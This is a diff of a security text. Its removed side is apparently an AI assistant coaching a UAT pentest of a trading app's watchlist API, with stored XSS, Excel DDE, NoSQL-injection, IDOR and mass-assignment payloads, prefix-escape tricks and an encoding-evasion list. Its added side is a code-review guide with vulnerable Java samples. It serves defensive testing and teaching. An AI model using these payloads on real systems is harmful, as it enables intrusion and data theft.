@@ -1,742 +1,629 @@
-But test it anyway.
-Payload
-{
-  "updateWatchList": {
-    "watchlistId": 27104571000,
-    "watchlistName": "<img src=x onerror=alert(document.domain)>"
-  }
-}
+Exactly. Finding a keyword is not a vulnerability. After searching the keyword, you need to inspect the surrounding code and determine what information is exposed, whether it is production-relevant, whether it is attacker-controlled, and whether a security control is missing.
+For a trading application, use this approach:
+Search keyword → inspect surrounding code → identify sensitive value → understand where it is used → determine security impact → confirm whether it is actually vulnerable.
 
-A safer first-stage marker is:
-{
-  "updateWatchList": {
-    "watchlistId": 27104571000,
-    "watchlistName": "<vapt-test>"
-  }
-}
+Below is the practical version with what to look for + vulnerable sample + safe sample + what finding you can raise.
+1. Hardcoded Passwords / Credentials — 🔴 Critical
+Search
+password
+passwd
+pwd
+username
+credential
 
-Then:
-1. Send request.
-2. Refresh the application.
-3. Navigate away.
-4. Return to the watchlist.
-5. Open watchlist selection.
-6. Check the DOM.
-7. Export the watchlist if applicable.
-Secure behavior
-The UI should display:
-<img src=x onerror=alert(document.domain)>
+When you find:
+String username = "admin";
+String password = "Welcome@123";
 
-as text.
-It should not create an <img> element.
-3. Watchlist IDOR / Broken Access Control — CRITICAL TEST
-Your request contains:
-"watchlistId": 27104571000
+What you should check
+Ask:
+1. Is this a real credential?
+2. Is it for production?
+3. What system does it authenticate to?
+4. Is it a database/admin/service account?
+5. Can the credential still be used?
+6. Is it committed in source control?
+7. Does it provide privileged access?
+Vulnerable
+String dbUser = "trading_admin";
+String dbPassword = "P@ssw0rd123";
 
-This is a very important parameter.
-You need two authorized UAT users to properly test this.
-Test
-Account A:
-{
-  "updateWatchList": {
-    "watchlistId": 27104571000,
-    "watchlistName": "A-Test"
-  }
-}
+This is much more serious than:
+String examplePassword = "password";
 
-Account B should have a different watchlist.
-Capture Account B's:
-watchlistId
+because the first appears to be an actual credential.
+Finding
+Hardcoded Database Credentials in Source Code
+Impact: Anyone obtaining the source code may obtain direct access to the trading database.
+2. API Keys — 🔴 Critical/High
+Search:
+apiKey
+api_key
+apikey
+accessKey
+secretKey
+clientSecret
 
-Then, while authenticated as Account A, change only:
-"watchlistId": "<Account-B-test-watchlist-id>"
+Vulnerable
+AWS_ACCESS_KEY_ID = "AKIAxxxxxxxxxxxx"AWS_SECRET_ACCESS_KEY = "xxxxxxxxxxxxxxxx"
 
-Example:
-{
-  "updateWatchList": {
-    "watchlistId": 27104572000,
-    "watchlistName": "VAPT-IDOR-TEST"
-  }
-}
 
-Expected
-Account A should receive something like:
-403 Forbidden
+What you check
+Determine:
+What service?
+       ↓
+Production or test?
+       ↓
+Read-only or write?
+       ↓
+What permissions?
+
+For example, an AWS key with read-only S3 access is different from a key capable of modifying production infrastructure.
+Also check
+.env
+application.properties
+application.yml
+config.json
+web.config
+appsettings.json
+
+Finding
+Hardcoded Cloud Service Credentials
+3. Private Key — 🔴 Critical
+Search:
+BEGIN PRIVATE KEY
+BEGIN RSA PRIVATE KEY
+BEGIN EC PRIVATE KEY
+
+Extremely dangerous
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEA...
+...
+-----END RSA PRIVATE KEY-----
+
+What to determine
+Check whether it is:
+- TLS private key
+- JWT signing key
+- SSH private key
+- encryption key
+- client certificate private key
+Particularly dangerous in trading applications
+If you find:
+jwt.private.key
 
 or:
-401 Unauthorized
+privateKey = "-----BEGIN PRIVATE KEY-----..."
 
-or an application-level authorization error.
-It must not modify Account B's watchlist.
-This is much more significant than the formula issue if exploitable.
-4. Watchlist read IDOR
-Don't test only modification.
-Find the API that retrieves:
-watchlistId
+check whether it signs authentication tokens.
+If yes, compromise could potentially allow token forgery.
+4. Database Connection String — 🔴 Critical/High
+Search:
+jdbc:
+connectionString
+Data Source=
+Server=
+User ID=
+Password=
+mongodb://
+postgresql://
 
-Then perform the same test.
-For example, if you identify:
-{
-  "watchlistId": 27104571000
+Vulnerable
+jdbc:sqlserver://10.10.10.50:1433;
+databaseName=TradingDB;
+user=trade_admin;
+password=XXXXXX
+
+Don't just report because you found:
+jdbc:sqlserver://10.10.10.50:1433
+
+An internal hostname/IP alone is generally not a critical vulnerability.
+The serious issue is:
+database + username + password
+
+Check
+- Production DB?
+- Privileged account?
+- Read/write?
+- Sensitive trading data?
+- Credentials still active?
+5. SQL Injection — 🔴 Critical/High
+Search:
+SELECT
+INSERT
+UPDATE
+DELETE
+executeQuery
+createStatement
+query
+
+Find:
+String sql =
+    "SELECT * FROM accounts WHERE accountId='" 
+    + request.getParameter("accountId") 
+    + "'";
+
+This is suspicious.
+Why?
+Because:
+request.getParameter()
+
+is attacker-controlled.
+And it is directly concatenated into SQL.
+Safer
+PreparedStatement ps =
+    connection.prepareStatement(
+        "SELECT * FROM accounts WHERE accountId=?"
+    );
+
+ps.setString(1, accountId);
+
+What to inspect
+Don't report every SQL query.
+Look for this pattern:
+User Input
+    ↓
+String concatenation
+    ↓
+SQL Query
+    ↓
+Database
+
+That's the important relationship.
+6. Authorization / IDOR — 🔴 Critical/High
+This is one of the most important areas for trading applications.
+Search:
+accountId
+customerId
+userId
+portfolioId
+orderId
+tradeId
+
+Suppose you find:
+@GetMapping("/account/{accountId}")
+public Account getAccount(
+        @PathVariable String accountId) {
+
+    return accountService.getAccount(accountId);
 }
 
-replace it with another approved test user's watchlist ID.
-Expected
-Account A → Account B watchlist
-             ↓
-           DENIED
+Now ask:
+Where is authorization performed?
 
-If Account A can retrieve Account B's watchlist, that's a confirmed Broken Object Level Authorization / IDOR issue.
-5. watchlistName SQL Injection
-Because the name is persisted, test the backend input handling.
-Start with harmless probes.
-Payload
-{
-  "updateWatchList": {
-    "watchlistId": 27104571000,
-    "watchlistName": "VAPT'"
-  }
+If there is no check like:
+authorizationService
+checkAccess
+hasPermission
+isOwner
+
+this becomes suspicious.
+Vulnerable logic
+Account account =
+    accountRepository.findById(accountId);
+
+return account;
+
+No check that:
+Authenticated User
+       ↓
+owns / authorized for
+       ↓
+accountId
+
+Trading impact
+Attacker:
+GET /account/10001
+
+changes:
+10001 → 10002
+
+and sees another customer's:
+- portfolio
+- holdings
+- balance
+- trades
+- account information
+Potential finding:
+Broken Object Level Authorization / IDOR
+7. Order Manipulation — 🔴 Critical/High
+Search:
+orderId
+quantity
+price
+orderType
+symbol
+buy
+sell
+cancelOrder
+modifyOrder
+
+Suppose:
+orderService.modifyOrder(
+    request.getParameter("orderId"),
+    request.getParameter("quantity"),
+    request.getParameter("price")
+);
+
+What you need to check
+Does the backend verify:
+Who owns the order?
+        ↓
+Is user authorized?
+        ↓
+Is order still modifiable?
+        ↓
+Is quantity valid?
+        ↓
+Is price valid?
+        ↓
+Is instrument valid?
+        ↓
+Are trading limits satisfied?
+
+Vulnerable example
+String orderId = request.getParameter("orderId");
+
+orderRepository.cancel(orderId);
+
+No ownership/authorization validation.
+Potential:
+Broken Access Control in Order Cancellation
+8. Negative Quantity / Price — 🔴 High
+Search:
+quantity
+qty
+price
+amount
+
+Suppose:
+if (quantity != 0) {
+    placeOrder(quantity);
 }
 
-Then:
-{
-  "updateWatchList": {
-    "watchlistId": 27104571000,
-    "watchlistName": "VAPT\""
-  }
+The code accepts:
+quantity = -100
+
+instead of:
+quantity > 0
+
+Similarly:
+if (price >= 0) {
+    executeOrder(price);
 }
 
-Then:
-{
-  "updateWatchList": {
-    "watchlistId": 27104571000,
-    "watchlistName": "VAPT')"
-  }
-}
+Check boundary validation.
+Look for
+< 0
+<= 0
+> maximum
+>= maximum
+Integer
+Long
+Double
+BigDecimal
 
-Look for:
-- HTTP 500
-- SQL error
-- database error
-- stack trace
-- abnormal response
-- changed query behavior
-Do not jump immediately to destructive SQL payloads. First establish whether the parameter reaches a database query unsafely.
-6. NoSQL / JSON injection
-If the backend accepts JSON and you want to test whether it improperly interprets objects rather than strings, replace the string with an object.
-Test
-{
-  "updateWatchList": {
-    "watchlistId": 27104571000,
-    "watchlistName": {
-      "$ne": null
-    }
-  }
-}
+For financial applications, this is a business-logic review, not merely input validation.
+9. Financial Calculation Problems — 🔴 High
+Search:
+amount
+price
+quantity
+commission
+fee
+tax
+balance
+margin
 
-Also:
-{
-  "updateWatchList": {
-    "watchlistId": 27104571000,
-    "watchlistName": {
-      "$regex": ".*"
-    }
-  }
-}
-
-Expected
-The API should reject these because watchlistName should be a string.
-For example:
-400 Bad Request
-
-7. Type confusion
-This is very useful for your API.
-Normally:
-"watchlistName": "My Watchlist"
-
-Test:
-Null
-{
-  "updateWatchList": {
-    "watchlistId": 27104571000,
-    "watchlistName": null
-  }
-}
-
-Number
-{
-  "updateWatchList": {
-    "watchlistId": 27104571000,
-    "watchlistName": 123456
-  }
-}
-
-Boolean
-{
-  "updateWatchList": {
-    "watchlistId": 27104571000,
-    "watchlistName": true
-  }
-}
-
-Array
-{
-  "updateWatchList": {
-    "watchlistId": 27104571000,
-    "watchlistName": []
-  }
-}
-
-Object
-{
-  "updateWatchList": {
-    "watchlistId": 27104571000,
-    "watchlistName": {}
-  }
-}
-
-Expected
-The API should reject invalid types.
-8. Mass Assignment / Extra Parameters
-Try adding properties that are not normally generated by the UI.
-For example:
-{
-  "updateWatchList": {
-    "watchlistId": 27104571000,
-    "watchlistName": "VAPT-Test",
-    "userId": "OTHER-USER",
-    "accountId": "OTHER-ACCOUNT",
-    "ownerId": "OTHER-USER",
-    "isDefault": true,
-    "isShared": true,
-    "role": "admin"
-  }
-}
-
-Don't assume these fields actually exist. The purpose is to determine whether the API accepts security-sensitive properties supplied by the client.
-Vulnerable behavior
-If adding:
-"ownerId": "OTHER-USER"
-
-changes ownership, that becomes a serious authorization issue.
-If:
-"isShared": true
-
-changes visibility without authorization, that's also significant.
-9. Duplicate watchlist symbols
-Your watchlist response contains instruments such as:
-GM
-GOOG
-
-Test whether the API allows the same symbol repeatedly.
-For example, if the update request contains:
-{
-  "watchlistId": 27104571000,
-  "symbols": [
-    "AAPL",
-    "AAPL",
-    "AAPL",
-    "AAPL"
-  ]
-}
-
-Expected:
-AAPL
-
-should exist once.
-Test whether duplicates are:
-- accepted
-- persisted
-- displayed
-- exported
-- counted separately
-This is similar to the account-group issue you found earlier.
-10. Instrument ID tampering
-Your response exposes:
-"instrumentId": 7162361
-
-and:
-"activeInstrumentId": 7162361
-
-If the update request accepts an instrumentId, test whether the server verifies that the instrument is valid and available to the user.
 Example:
-{
-  "watchlistId": 27104571000,
-  "instrumentId": 7162361,
-  "watchlistSymbol": "GOOG"
+double total =
+    quantity * price;
+
+Check
+- Floating-point calculations
+- Rounding
+- Currency precision
+- Negative values
+- Overflow
+- Currency conversion
+- Client-controlled totals
+Better
+BigDecimal total =
+    price.multiply(quantity);
+
+For financial applications, inappropriate floating-point arithmetic can be significant.
+10. Sensitive Customer Data — 🔴 High
+Search:
+SSN
+socialSecurity
+taxId
+DOB
+dateOfBirth
+bankAccount
+routingNumber
+accountNumber
+email
+phone
+address
+
+Suppose:
+logger.info(
+    "Customer SSN: " + customer.getSSN()
+);
+
+This is a real security concern
+Because sensitive information is being written to logs.
+Another example:
+return new CustomerResponse(
+    customer.getName(),
+    customer.getSSN(),
+    customer.getBankAccount()
+);
+
+Now ask:
+Is the entire response actually required?
+
+If a normal user can receive another customer's SSN/bank account, that's much more serious.
+11. Sensitive Data in Logs — 🔴 High
+Search:
+logger
+log.info
+log.debug
+log.error
+System.out
+console.log
+
+Then search around these for:
+password
+token
+authorization
+cookie
+SSN
+accountNumber
+creditCard
+bankAccount
+
+Vulnerable
+logger.debug(
+    "Authorization token: " + token
+);
+
+or:
+logger.info(
+    "Customer account: " + accountNumber
+);
+
+What you determine
+Ask:
+What is being logged?
+        ↓
+Where does the log go?
+        ↓
+Who can access logs?
+        ↓
+Production or development?
+
+12. JWT — 🔴 High
+Search:
+JWT
+jwt
+token
+access_token
+refresh_token
+Jwts
+JwtParser
+
+Suspicious
+Claims claims = JWT.decode(token);
+
+If this only decodes the JWT without cryptographic signature verification, that's dangerous.
+Check whether code validates:
+Signature
+        +
+Issuer (iss)
+        +
+Audience (aud)
+        +
+Expiration (exp)
+        +
+Not Before (nbf)
+        +
+Algorithm
+
+Very dangerous
+if (algorithm.equals("none")) {
+    // accept token
 }
 
-Then test an invalid value:
-{
-  "watchlistId": 27104571000,
-  "instrumentId": 999999999,
-  "watchlistSymbol": "VAPT"
-}
+or hardcoded signing secrets:
+String secret = "TradingSecret123";
 
-And mismatched values:
-{
-  "watchlistId": 27104571000,
-  "instrumentId": 7162361,
-  "watchlistSymbol": "AAPL"
-}
+13. Refresh Token — 🔴 High
+Search:
+refreshToken
+refresh_token
 
-The backend should not blindly trust the client relationship between:
-instrumentId ↔ symbol
+Example:
+String refreshToken =
+    request.getParameter("refresh_token");
 
-11. Watchlist symbol tampering
-If you find an update request containing:
-{
-  "watchlistSymbol": "GOOG"
-}
-
-test:
-{
-  "watchlistSymbol": "<vapt-test>"
-}
-
-{
-  "watchlistSymbol": "../../vapt"
-}
-
-{
-  "watchlistSymbol": "AAPL<script>"
-}
-
-{
-  "watchlistSymbol": "AAPL'"
-}
-
-The backend should validate the symbol against the supported instrument model.
-12. Watchlist name length / DoS-style validation
-Test progressively increasing lengths.
-Start with:
-{
-  "updateWatchList": {
-    "watchlistId": 27104571000,
-    "watchlistName": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
-  }
-}
-
-Then test the documented maximum plus one.
-For example, if maximum is 50:
-{
-  "updateWatchList": {
-    "watchlistId": 27104571000,
-    "watchlistName": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
-  }
-}
-
-Expected:
-400 Bad Request
-
-or controlled validation.
-Also check whether extremely long values cause:
-- UI freezing
-- database errors
-- HTTP 500
-- export failure
-- layout corruption
-13. Unicode / encoding
-Test:
-{
-  "updateWatchList": {
-    "watchlistId": 27104571000,
-    "watchlistName": "VAPT-日本-తెలుగు-测试"
-  }
-}
-
-And:
-{
-  "updateWatchList": {
-    "watchlistId": 27104571000,
-    "watchlistName": "VAPT\u0000TEST"
-  }
-}
+return generateAccessToken(refreshToken);
 
 Check:
-- API response
-- UI
-- persistence
-- Excel export
-14. CORS
-Your response shows:
-Access-Control-Allow-Origin: https:...
-Access-Control-Allow-Credentials: ...
+- Is refresh token signature validated?
+- Is it tied to the client?
+- Is it revocable?
+- Is expiration enforced?
+- Can another user's refresh token be used?
+- Is token rotation implemented?
+- Is old refresh token invalidated?
+14. SSRF — 🔴 High
+Search:
+URL
+URI
+HttpClient
+RestTemplate
+WebClient
+requests
+fetch
+axios
 
-The screenshot truncates the values, so you need to inspect the Raw response.
-Test with a controlled origin.
-For example:
-Origin: https://attacker.example
+Find:
+String url =
+    request.getParameter("url");
 
-Send the same request and inspect:
-Access-Control-Allow-Origin
-Access-Control-Allow-Credentials
+httpClient.get(url);
 
-Secure result
-The server should not allow an arbitrary origin to read authenticated responses.
-Particularly investigate the combination:
-Access-Control-Allow-Origin: *
-Access-Control-Allow-Credentials: true
+This is the important pattern:
+Attacker input
+     ↓
+URL
+     ↓
+Server makes request
 
-That combination is problematic and normally rejected by browsers, but dynamic origin reflection can also be dangerous if implemented incorrectly.
-15. Security headers
-From your screenshot I can already see:
-Strict-Transport-Security
-X-XSS-Protection
+Then investigate whether the attacker can target:
+localhost
+127.0.0.1
+internal systems
+cloud metadata
+internal admin APIs
 
-and:
-Cache-Control: no-cache, no-store
-Pragma: no-cache
+15. Command Injection — 🔴 Critical
+Search:
+Runtime.getRuntime
+exec
+ProcessBuilder
+system
+shell_exec
+subprocess
 
-These are useful.
-Check the complete response for:
-Content-Security-Policy
-X-Content-Type-Options
-X-Frame-Options
-Referrer-Policy
-Permissions-Policy
-Strict-Transport-Security
-Cache-Control
+Vulnerable
+String host =
+    request.getParameter("host");
 
-For the financial application, pay particular attention to:
-Cache-Control: no-store
+Runtime.getRuntime().exec(
+    "ping " + host
+);
 
-for authenticated/account-sensitive responses.
-16. ETag / cache testing
-Your response contains:
-ETag: W/"..."
+The key thing is not simply finding exec().
+You need:
+Untrusted input
+      ↓
+Command construction
+      ↓
+OS execution
 
-Test whether an authenticated response can be retrieved from cache after logout or from another session.
-Workflow:
-Account A
-   ↓
-GET watchlist
-   ↓
-Capture ETag
-   ↓
-Logout
-   ↓
-Replay request
+16. File Read / Path Traversal — 🔴 High
+Search:
+File
+FileInputStream
+download
+filename
+path
+getPath
 
-Then test with Account B.
-The server must not accidentally return Account A's cached watchlist to Account B.
-This is particularly important because the application contains financial/account data.
-17. HTTP parameter pollution
-If you identify a URL parameter such as:
-?watchlistId=27104571000
+Find:
+String filename =
+    request.getParameter("filename");
 
-test:
-?watchlistId=27104571000&watchlistId=27104572000
+File file =
+    new File("/reports/" + filename);
 
-or if it is JSON:
-{
-  "watchlistId": 27104571000,
-  "watchlistId": 27104572000
+Ask:
+Can attacker control filename?
+
+Potential:
+../../../../sensitive-file
+
+The vulnerability exists when the application fails to constrain the resolved path.
+17. Unsafe Deserialization — 🔴 Critical/High
+Search:
+ObjectInputStream
+readObject
+deserialize
+BinaryFormatter
+TypeNameHandling
+
+Example:
+ObjectInputStream in =
+    new ObjectInputStream(inputStream);
+
+Object obj = in.readObject();
+
+Ask
+Where did inputStream come from?
+If:
+HTTP request
+        ↓
+attacker-controlled data
+        ↓
+ObjectInputStream
+        ↓
+readObject()
+
+that's a major red flag.
+18. TLS Certificate Validation — 🔴 High
+Search:
+TrustManager
+X509TrustManager
+HostnameVerifier
+checkServerTrusted
+verify
+SSLContext
+
+Very dangerous
+public void checkServerTrusted(
+    X509Certificate[] certs,
+    String authType) {
+    // no validation
 }
 
-Observe which value the server uses.
-Security-sensitive parameters should have deterministic handling.
-18. The most important test chain for YOUR screenshot
-I would execute these in this exact order:
-Test 1 — Stored formula injection
-{
-  "updateWatchList": {
-    "watchlistId": 27104571000,
-    "watchlistName": "=1+1"
-  }
-}
+Or:
+return true;
 
-Then export to Excel.
-If Excel displays 2 → confirmed formula injection.
-Test 2 — Stored XSS
-{
-  "updateWatchList": {
-    "watchlistId": 27104571000,
-    "watchlistName": "<img src=x onerror=alert(document.domain)>"
-  }
-}
+inside hostname verification.
+This can effectively disable certificate validation and expose communications to MITM attacks.
+19. Hardcoded Encryption Keys — 🔴 High
+Search:
+encryptionKey
+secretKey
+AES
+Cipher
+key
+IV
+salt
 
-Refresh the application.
-If JavaScript executes → confirmed stored XSS.
-Test 3 — IDOR
-Using two UAT users:
-{
-  "updateWatchList": {
-    "watchlistId": "<USER-B-TEST-WATCHLIST-ID>",
-    "watchlistName": "IDOR-TEST"
-  }
-}
-
-while authenticated as User A.
-If User A modifies User B's watchlist → serious BOLA/IDOR finding.
-Test 4 — Mass assignment
-{
-  "updateWatchList": {
-    "watchlistId": 27104571000,
-    "watchlistName": "VAPT-Test",
-    "ownerId": "<OTHER-TEST-USER>",
-    "accountId": "<OTHER-TEST-ACCOUNT>",
-    "isShared": true,
-    "role": "admin"
-  }
-}
-
-If any security-sensitive property is honored → investigate as authorization/business-logic vulnerability.
-Test 5 — Type validation
-{
-  "updateWatchList": {
-    "watchlistId": 27104571000,
-    "watchlistName": {}
-  }
-}
+Vulnerable
+String encryptionKey =
+    "1234567890123456";
 
 Then:
-{
-  "updateWatchList": {
-    "watchlistId": 27104571000,
-    "watchlistName": []
-  }
+Cipher cipher =
+    Cipher.getInstance("AES");
+
+The important question:
+Is the key stored securely or embedded in source?
+
+If source code contains a production encryption key, treat it seriously.
+20. Debug / Backdoor Accounts — 🔴 Critical
+Search:
+admin
+test
+debug
+bypass
+backdoor
+master
+support
+impersonate
+
+Extremely suspicious
+if (username.equals("support")) {
+    return true;
 }
-
-Then:
-{
-  "updateWatchList": {
-    "watchlistId": 27104571000,
-    "watchlistName": null
-  }
-}
-
-All should be rejected.
-One important point from your screenshots
-Your Excel screenshot is very valuable evidence.
-You have:
-Watchlist =cmd|' /C calc'!A
-
-persisted into the exported spreadsheet.
-But don't report it as confirmed formula injection yet merely because the string appears in Excel. The decisive test is whether Excel interprets the cell as a formula.
-Use:
-"watchlistName": "=1+1"
-
-Export it and see whether the resulting cell is:
-=1+1
 
 or:
-2
-
-If you get 2, send me the request/response and the exported-cell screenshot. I can help you determine the exact finding title, CWE, severity, attack scenario, impact, and remediation.   
-
-
-
-
-
-    
-
-
-
-
-
-
-
-
-
-
-if i send 1+1
-
-
-
-
-
- 
-
-
-
-
-
-
-If you send 1+1, this is not a formula-injection payload. Excel will treat it as ordinary text.
-Your latest screenshot is more important: you sent:
-=1+1
-
-and the exported Excel shows:
-Watchlist =1+1, as of 09/30/26 at 10:54 AM EST
-
-That means the application is prepending Watchlist  before your supplied value. Therefore Excel sees the complete cell value as:
-Watchlist =1+1, as of ...
-
-rather than a formula beginning with =.
-So currently
-Test	Result	Assessment
-1+1	Displayed as text	Not formula injection
-=1+1	Exported as Watchlist =1+1, ...	No formula execution demonstrated
-=HYPERLINK(...)	Need to test	Check whether prefix prevents execution
-+1+1	Need to test	Check spreadsheet interpretation
--1+1	Need to test	Check spreadsheet interpretation
-@SUM(1,1)	Need to test	Check spreadsheet interpretation
-
-
-One more important test
-Don't test only the watchlist name. Your exported Excel contains other attacker-influenced fields:
-Symbol
-Description
-
-The watchlist name is apparently safely embedded into a larger string. But if a user-controlled Symbol or Description is written directly into an Excel cell, formula injection could still exist there.
-For example, if you have an API field that controls a symbol/description and the exported cell becomes exactly:
-=1+1
-
-rather than:
-Watchlist =1+1
-
-then Excel may evaluate it.
-For your current finding
-I would not report CSV/Excel Formula Injection based on this evidence. Your screenshot actually provides evidence that the watchlistName value is being incorporated into a larger text string, preventing it from being interpreted as an Excel formula.
-If you want to continue testing this properly, capture the API request that adds/updates a watchlist symbol, not just the watchlist name. That is the next place I'd check for formula injection.
-
-
-
-
-
-    
-
-
-
-
-
-
-
-
-any way to escape this prepending Watchlist 
-
-
-
-
-
-
-
- 
-
-
-
-
-
-
-If the exporter is constructing the Excel cell as something like:
-"Watchlist " + watchlistName + ", as of " + date
-
-then you generally cannot escape the Watchlist  prefix from the watchlistName field itself. Excel sees the entire resulting value, so:
-Watchlist =1+1, as of ...
-
-doesn't start with =, and therefore isn't a formula.
-However, for a VAPT assessment, you can safely check whether the prefix can be bypassed through encoding, line breaks, or another exported field.
-1. Test newline injection
-Try:
-{
-  "watchlistName": "\n=1+1"
+if (request.getParameter("debug").equals("true")) {
+    disableAuthentication();
 }
 
-and:
-{
-  "watchlistName": "\r\n=1+1"
-}
-
-
-&lt;test&gt;
-&#60;test&#62;
-&#x3C;test&#x3E;
-&#x3c;test&#x3e;
-&#00060;test&#00062;
-&#000060;test&#000062;
-&#x00003C;test&#x00003E;
-&#x0000003C;test&#x0000003E;
-
-%3Ctest%3E
-%3ctest%3e
-%253Ctest%253E
-%253ctest%253e
-%25253Ctest%25253E
-%25253ctest%25253e
-
-%26lt%3Btest%26gt%3B
-%26%2360%3Btest%26%2362%3B
-%26%23x3C%3Btest%26%23x3E%3B
-
-&amp;lt;test&amp;gt;
-&amp;#60;test&amp;#62;
-&amp;#x3C;test&amp;#x3E;
-
-\u003Ctest\u003E
-\u003cTEST\u003e
-\u003Ctest\u003e
-\u003cTEST\u003E
-
-\x3Ctest\x3E
-\x3ctest\x3e
-
-%u003Ctest%u003E
-%u003ctest%u003e
-
-<%74est>
-<%74%65%73%74>
-%3C%74%65%73%74%3E
-
-<test%3E
-%3Ctest>
-%3Ctest%3e
-%3ctest%3E
-
-&lt%3Btest&gt%3B
-&#x3c;test&gt;
-&lt;test&#x3e;
-
-&#60;test&gt;
-&lt;test&#62;
-&#x3C;test&#62;
-&#60;test&#x3E;
-
-%26lt%3Btest%26gt%3B
-%2526lt%253Btest%2526gt%253B
-
-VAPT&lt;test&gt;
-VAPT&#60;test&#62;
-VAPT&#x3C;test&#x3E;
-VAPT%3Ctest%3E
-
-VAPT%253Ctest%253E
-VAPT%25253Ctest%25253E
-
-VAPT&amp;lt;test&amp;gt;
-VAPT&amp;#60;test&amp;#62;
-VAPT&amp;#x3C;test&amp;#x3E;
-
-[&lt;test&gt;]
-{&lt;test&gt;}
-(&lt;test&gt;)
-"&lt;test&gt;"
-'&lt;test&gt;'
-
-&lt;/test&gt;
-&#60;/test&#62;
-&#x3C;/test&#x3E;
-%3C%2Ftest%3E
-
-&lt;test/&gt;
-&#60;test/&#62;
-&#x3C;test/&#x3E;
-%3Ctest%2F%3E
-
-&lt;test /&gt;
-&#60;test /&#62;
-&#x3C;test /&#x3E;
-%3Ctest%20%2F%3E
-
-%253C%252Ftest%253E
-%25253C%252Ftest%25253E
-
-%00%3Ctest%3E
-%0A%3Ctest%3E
-%0D%3Ctest%3E
-%09%3Ctest%3E
-
-%3C%00test%3E
-%3C%0Atest%3E
-%3C%0Dtest%3E
-%3C%09test%3E
+This should be investigated immediately.
